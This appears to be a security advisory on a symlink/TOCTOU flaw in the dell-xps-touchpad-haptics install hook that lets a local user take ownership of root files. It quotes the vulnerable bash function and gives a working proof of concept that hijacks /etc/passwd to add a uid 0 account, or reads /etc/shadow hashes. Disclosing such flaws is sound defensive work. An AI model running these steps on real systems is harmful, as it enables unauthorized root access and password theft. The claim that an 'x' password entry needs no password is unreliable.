## Arbitrary File Ownership Change via Symlink in dell-xps-touchpad-haptics Leading to LPE

**dell-xps-touchpad-haptics 1.0.0-3, Omarchy 4.0.4**<br>
A local unprivileged user can abuse the install script and escalate privileges after the package installs/upgrades
<br>
•	Improper Link Resolution Before File Access (CWE-59) <br>
•	**TOCTOU** (Time-of-check Time-of-use) Race Condition (CWE-367)<br>

## Summary

The dell-xps-touchpad-haptics ALPM install script performs a privileged chown operation on the user-controlled path `~/.config/omarchy/dell-haptic.conf`. Before changing ownership, the script checks the path using a regular-file (`-f`) test. Both the check and subsequent chown follow symbolic links. <br>

Because of this, an unprivileged local user can replace `dell-haptic.conf` with a symbolic link to a root-owned regular file such as `/etc/passwd`. On the next legitimate package install/upgrade, the ALPM script executes as root, follows the symbolic link, and changes ownership of the target file to the selected desktop user. 

**Impact:** An attacker can gain write access to a root-owned file through the selected vulnerable path. When /etc/passwd is targeted, it permits modification of system account data, including the creation of a uid 0 account, resulting in full local privilege escalation. The attacker doesn't need to invoke the package manager with elevated privileges directly; exploitation is triggered by a later legitimate package install/upgrade for root.

## Details
ALPM install scripts execute with root privileges during package installs/upgrades and the affected package identifies a desktop user, derives a configuration path beneath that user's writable home directory and invokes `_ensure_user_config` from both `post_install` and `post_upgrade`.

In `_ensure_user_config`, the script checks whether `~/.config/omarchy/dell-haptic.conf` is a regular file and later applies chown to the same pathname. Because symbolic links aren't rejected, both operations follow them, an attacker retains control over which filesystem object is referenced by that path. 

For example, an attacker can create `~/.config/omarchy/dell-haptic.conf` -> `/etc/passwd` without elevated privileges. When a subsequent package install/upgrade executes the script as root, chown follows the symlink/operates on /etc/passwd instead of the intended config file, transferring ownership of the target to the desktop user.

The affected code path in the ALPM `post_install` and `post_upgrade` hooks:

```bash
_ensure_user_config() {
    local user="$1"
    local config_path="$HOME/.config/omarchy/dell-haptic.conf"
    
    if [ ! -f "$config_path" ]; then
        install -m 644 /etc/omarchy/dell-haptic.conf.default "$config_path"
    fi
    chown "$user:$user" "$config_path"
}
```

## PoC
1. A user with uid 1000 creates the symbolic link without sudo
2. /etc/passwd is owned by root:root and the affected package is reinstalled, causing the script to execute as root
3. Ownership of /etc/passwd changes from uid 0 to uid 1000 and the attacker modifies the user-owned account resulting in uid 0 (root)

```bash
# As an unprivileged user
mkdir -p ~/.config/omarchy
ln -s /etc/passwd ~/.config/omarchy/dell-haptic.conf

# Trigger package upgrade
sudo pacman -Syu dell-xps-touchpad-haptics

# Verify ownership change
ls -la /etc/passwd

# Create privileged account
echo "pwned:x:0:0::/root:/bin/bash" >> /etc/passwd
su pwned  # No password required for uid 0
```

Alternatively, targeting `/etc/shadow` provides read access to password hashes:

```bash
# After chown, user can read hashes and perform offline cracking
ln -s /etc/shadow ~/.config/omarchy/dell-haptic.conf
```


